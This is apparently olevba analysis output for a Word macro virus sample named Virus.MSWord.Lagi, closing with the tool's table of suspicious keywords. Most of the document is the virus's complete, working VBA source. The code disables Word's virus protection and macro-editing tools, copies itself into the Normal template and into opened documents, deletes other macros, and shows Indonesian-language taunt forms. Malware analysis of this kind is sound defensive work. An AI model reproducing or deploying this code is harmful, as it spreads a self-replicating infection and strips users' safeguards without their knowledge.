olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MARSandDMarelover.bas 
in file: Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9 - OLE stream: 'Macros/VBA/MARSandDMarelover'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public MARSalerts
Public MARSdocsaving
Public MARSnormal
Public MARSdocument
Sub MARSsetup()
    MARSalerts = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call MARSbreakdown
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi()
Application.DisplayAlerts = MARSalerts
End Sub
Sub USA_is_BAD_country_no1()
    Call MARSbreakdown
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas1
    MARSnormal = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo cinta_itu_memang_indah_nak_kelas1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "MARSandDMarelover" Then MARSnormal = True
      If (NMacr <> "MARSandDMarelover") And (NMacr <> "MARS_is_my_flagForm") And (NMacr <> "MARS_funky_abis_form1") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
cinta_itu_memang_indah_nak_kelas1a:
    If MARSnormal = False Then
      On Error GoTo cinta_itu_memang_indah_nak_kelas1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "MARSandDMarelover", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "MARS_is_my_flagForm", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "MARS_funky_abis_form1", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
cinta_itu_memang_indah_nak_kelas1:
    End If
kita_jalin_cinta_itu_sejak_dulu_kelas1:
End Sub
Sub Love_kill_War()
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas2
    MARSdocsaving = 0
    MARSdocument = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo cinta_itu_memang_indah_nak_kelas2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "MARSandDMarelover" Then MARSdocument = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "MARSandDMarelover" Then MARSdocument = True
      If (NMacr <> "MARSandDMarelover") And (NMacr <> "MARS_is_my_flagForm") And (NMacr <> "MARS_funky_abis_form1") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
cinta_itu_memang_indah_nak_kelas2a:
    If MARSdocument = False Then
      On Error GoTo cinta_itu_memang_indah_nak_kelas2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MARSandDMarelover", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MARS_is_my_flagForm", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MARS_funky_abis_Form1", Object:=wdOrganizerObjectProjectItems
             
      MARSdocsaving = 1
cinta_itu_memang_indah_nak_kelas2:
    End If
kita_jalin_cinta_itu_sejak_dulu_kelas2:
End Sub
Sub MARS_is_my_flag()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
End Sub
Sub MARSbreakdown()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Sering_Saving_itu_bih_baik()
    On Error GoTo cinta_itu_memang_indah_nak_kelas4
Set AD = ActiveDocument
    If MARSdocsaving = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
cinta_itu_memang_indah_nak_kelas4:
End Sub
Sub AutoOpen()
    Call MARS_is_my_flag
End Sub
Sub FileClose()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call MARS_is_my_flag
    Dialogs(wdDialogFileOpen).Show
    Call MARSsetup
    Call Love_kill_War
    Call Sering_Saving_itu_bih_baik
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
End Sub
Sub FileSaveAs()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas3
    MARS_is_my_flagForm.Show
kita_jalin_cinta_itu_sejak_dulu_kelas3:
End Sub
Sub FileExit()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas4
    If WeekDay(Date) = 6 Then MARS_is_my_flagForm.Show
kita_jalin_cinta_itu_sejak_dulu_kelas4:
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call MARS_is_my_flag
End Sub
Sub FileNew()
    Call MARS_is_my_flag
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call MARS_is_my_flag
End Sub
Sub ToolsMacro()
    Call MARS_is_my_flag
End Sub
Sub ToolsCustomize()
    Call MARS_is_my_flag
End Sub
Sub ToolsCustomizeKeyboard()
    Call MARS_is_my_flag
End Sub
Sub ViewVBCode()
    Call MARS_is_my_flag
End Sub
Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA MACRO MARS_is_my_flagForm.frm 
in file: Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9 - OLE stream: 'Macros/VBA/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





































































































Private Sub CommandButton1_Click()
MARS_funky_abis_form1.Show
Unload Me
End Sub

Private Sub CommandButton2_Click()
MARS_funky_abis_form1.Show
Unload Me
End Sub

Private Sub CommandButton4_Click()
MARS_funky_abis_form1.Show
Unload Me
End Sub

Private Sub Label1_Click()

End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO MARS_funky_abis_form1.frm 
in file: Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9 - OLE stream: 'Macros/VBA/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!!   ANDA BELOM BERUNTUNG  !!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tapi Kali ini Gue Lagi Baek, elo gue maafin
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�maka elo harus ati-ati pisan, kanu virus komputer teh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ya, mah. Aku Akan Berhati-hati lagi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Okeylah
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� Baiklah�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yes Sir !!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PILIH DONG SATU YANG BENER JIKA SALAH SO TANGGUNG OLEH KAMU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
System@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Lagi-f972e6cbd79f1953a8fa9555a6009c067812e6b9' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

